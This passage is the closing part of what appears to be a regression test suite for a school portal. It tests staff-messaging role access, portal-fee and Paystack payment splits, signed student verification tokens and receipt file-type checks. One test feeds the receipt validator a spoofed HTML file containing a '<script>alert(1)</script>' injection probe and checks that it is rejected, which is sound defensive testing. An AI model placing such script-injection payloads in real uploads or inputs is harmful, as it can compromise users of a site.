  }

  // 16. Strict Admin <-> Teacher Staff Messaging Access Control
  {
    assert.equal(isAuthorizedStaffCommRoleSet(["ADMIN"]), true);
    assert.equal(isAuthorizedStaffCommRoleSet(["PRINCIPAL"]), true);
    assert.equal(isAuthorizedStaffCommRoleSet(["TEACHER"]), true);
    assert.equal(isAuthorizedStaffCommRoleSet(["FORM_MASTER"]), true);
    assert.equal(isAuthorizedStaffCommRoleSet(["PARENT"]), false, "Parents must be blocked from Admin-Teacher Comms");
    assert.equal(isAuthorizedStaffCommRoleSet(["STUDENT"]), false, "Students must be blocked from Admin-Teacher Comms");
    assert.equal(classifyStaffContactGroup(["PRINCIPAL"]), "ADMINISTRATION");
    assert.equal(classifyStaffContactGroup(["FORM_MASTER"]), "TEACHERS");
    assert.equal(classifyStaffContactGroup(["PARENT"]), null);
    assert.equal(formatStaffRoleLabel("FORM_MASTER"), "Class Teacher");
    passed++;
  }

  // 17. ₦1,000 Gross Portal Fee (₦800 Provider / ₦200 School), Partial Instalments, Waivers, Gateway Bearer & Selective Reversals
  {
    const termInvoice = computeTermInvoiceTotals({
      tuitionKobo: BigInt(5_900_000), // ₦59,000
      leviesKobo: BigInt(0),
      isSchoolFeesWaived: false,
    });
    assert.equal(termInvoice.portalFeeKobo, GROSS_PORTAL_FEE_KOBO);
    assert.equal(termInvoice.portalProviderCapKobo, PROVIDER_PORTAL_SHARE_CAP_KOBO);
    assert.equal(termInvoice.portalSchoolCapKobo, SCHOOL_PORTAL_SHARE_CAP_KOBO);
    assert.equal(termInvoice.totalInvoiceKobo, BigInt(6_000_000)); // ₦60,000 total

    // Default gateway fee policy is SCHOOL_ABSORBS (₦0 surcharge)
    assert.equal(computePaystackConvenienceFeeKobo(BigInt(3_000_000), "SCHOOL_ABSORBS"), BigInt(0));
    assert.equal(computePaystackConvenienceFeeKobo(BigInt(3_000_000)), BigInt(0));

    // Partial Instalment Sequence: ₦500 -> ₦500 -> ₦30,000
    const p1 = allocateTermPaymentKobo({
      grossPrincipalPaidKobo: BigInt(50_000),
      targetPortalFeeKobo: GROSS_PORTAL_FEE_KOBO,
      alreadyAllocatedProviderKobo: BigInt(0),
      alreadyAllocatedSchoolPortalKobo: BigInt(0),
    });
    assert.equal(p1.providerShareKobo, BigInt(40_000)); // ₦400
    assert.equal(p1.schoolPortalShareKobo, BigInt(10_000)); // ₦100
    assert.equal(p1.schoolChargesShareKobo, BigInt(0));

    const p2 = allocateTermPaymentKobo({
      grossPrincipalPaidKobo: BigInt(50_000),
      targetPortalFeeKobo: GROSS_PORTAL_FEE_KOBO,
      alreadyAllocatedProviderKobo: p1.providerShareKobo,
      alreadyAllocatedSchoolPortalKobo: p1.schoolPortalShareKobo,
    });
    assert.equal(p2.providerShareKobo, BigInt(40_000)); // Cumulative Provider = ₦800
    assert.equal(p2.schoolPortalShareKobo, BigInt(10_000)); // Cumulative School Portal = ₦200
    assert.equal(p2.schoolChargesShareKobo, BigInt(0));
    assert.equal(p2.remainingPortalFeeAfterKobo, BigInt(0));

    const p3 = allocateTermPaymentKobo({
      grossPrincipalPaidKobo: BigInt(3_000_000), // ₦30,000
      targetPortalFeeKobo: GROSS_PORTAL_FEE_KOBO,
      alreadyAllocatedProviderKobo: p1.providerShareKobo + p2.providerShareKobo,
      alreadyAllocatedSchoolPortalKobo: p1.schoolPortalShareKobo + p2.schoolPortalShareKobo,
    });
    assert.equal(p3.providerShareKobo, BigInt(0));
    assert.equal(p3.schoolPortalShareKobo, BigInt(0));
    assert.equal(p3.schoolChargesShareNaira, 30000);

    // Large First Instalment (₦30,000) under optional PAYER_SURCHARGE
    const gw1 = computePaystackConvenienceFeeKobo(BigInt(3_000_000), "PAYER_SURCHARGE");
    assert(gw1 > BigInt(0), "Paystack convenience fee must be positive under PAYER_SURCHARGE");
    const largeFirst = allocateTermPaymentKobo({
      grossPrincipalPaidKobo: BigInt(3_000_000),
      targetPortalFeeKobo: GROSS_PORTAL_FEE_KOBO,
      alreadyAllocatedProviderKobo: BigInt(0),
      alreadyAllocatedSchoolPortalKobo: BigInt(0),
      gatewayFeeKobo: gw1,
    });
    assert.equal(largeFirst.providerShareNaira, 800);
    assert.equal(largeFirst.schoolPortalShareNaira, 200);
    assert.equal(largeFirst.schoolChargesShareNaira, 29000);
    assert.equal(largeFirst.schoolShareNaira, 29200);
    assert.equal(largeFirst.totalChargedKobo, BigInt(3_000_000) + gw1);

    // Paystack Subaccount Split: Main Account receives totalCharged - ₦800
    const split = computePaystackSubaccountSplitKobo({
      totalChargedKobo: largeFirst.totalChargedKobo,
      providerShareKobo: largeFirst.providerShareKobo,
    });
    assert.equal(split.expectedSubaccountShareKobo, BigInt(80_000));
    assert.equal(split.transactionChargeMainAccountKobo, largeFirst.schoolShareKobo + gw1);
    assert.equal(split.bearer, "account");

    // Scholarship tuition waiver keeps ₦1,000 Portal Fee; Hardship exemption waives all; 50% proration -> ₦500 (₦400/₦100)
    const waived = computeTermInvoiceTotals({
      tuitionKobo: BigInt(8_000_000),
      leviesKobo: BigInt(500_000),
      isSchoolFeesWaived: true,
    });
    assert.equal(waived.schoolSubtotalKobo, BigInt(0));
    assert.equal(waived.portalFeeKobo, GROSS_PORTAL_FEE_KOBO);

    const prorated = computeTermInvoiceTotals({
      tuitionKobo: BigInt(5_000_000),
      leviesKobo: BigInt(0),
      portalFeeProrationPct: 50,
    });
    assert.equal(prorated.portalFeeKobo, BigInt(50_000));
    assert.equal(prorated.portalProviderCapKobo, BigInt(40_000));
    assert.equal(prorated.portalSchoolCapKobo, BigInt(10_000));

    // Selective reversals: TUITION_ONLY vs FULL
    const revTuitionOnly = computeReversalAllocationKobo({
      scope: "TUITION_ONLY",
      creditedSchoolChargesKobo: largeFirst.schoolChargesShareKobo,
      creditedSchoolPortalKobo: largeFirst.schoolPortalShareKobo,
      creditedProviderKobo: largeFirst.providerShareKobo,
    });
    assert.equal(revTuitionOnly.providerShareKobo, BigInt(0));
    assert.equal(revTuitionOnly.schoolPortalShareKobo, BigInt(0));
    assert.equal(revTuitionOnly.schoolChargesShareKobo, -BigInt(2_900_000));

    const revFull = computeReversalAllocationKobo({
      scope: "FULL",
      creditedSchoolChargesKobo: largeFirst.schoolChargesShareKobo,
      creditedSchoolPortalKobo: largeFirst.schoolPortalShareKobo,
      creditedProviderKobo: largeFirst.providerShareKobo,
      gatewayFeeKobo: gw1,
    });
    assert.equal(revFull.providerShareKobo, -BigInt(80_000));
    assert.equal(revFull.schoolPortalShareKobo, -BigInt(20_000));
    assert.equal(revFull.schoolChargesShareKobo, -BigInt(2_900_000));
    assert.equal(revFull.schoolShareKobo, -BigInt(2_920_000));
    passed++;
  }

  // 18. Signed QR Student Verification Tokens & Private Receipt Magic Bytes
  {
    const id = "WOFS-STU-2026-000042";
    const sig = signStudentVerificationToken(id);
    assert.equal(sig.length, 22);
    assert.equal(verifyStudentVerificationToken(id, sig), true);
    assert.equal(verifyStudentVerificationToken("wofs-stu-2026-000042", sig), true);
    assert.equal(verifyStudentVerificationToken("WOFS-STU-2026-000043", sig), false);
    assert.equal(verifyStudentVerificationToken(id, ""), false);
    const url = buildSignedStudentVerifyUrl("https://portal.wofs.edu.ng/", id, sig);
    assert(url.includes("?sig="));

    // Confirm real PNG/JPEG/PDF binary headers accepted and spoofed HTML rejected
    assert.equal(
      validateReceiptBinary(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), "image/png").valid,
      true
    );
    assert.equal(
      validateReceiptBinary(Buffer.from("<!DOCTYPE html><script>alert(1)</script>"), "image/png").valid,
      false
    );
    passed++;
  }

  console.log(`✅ ALL ${passed}/18 SECURITY & FUNCTIONAL REGRESSION TEST SUITES PASSED.`);
}

runSecurityRegressionSuite().catch((err) => {
  console.error("❌ Security regression suite failed:", err);
  process.exit(1);
});
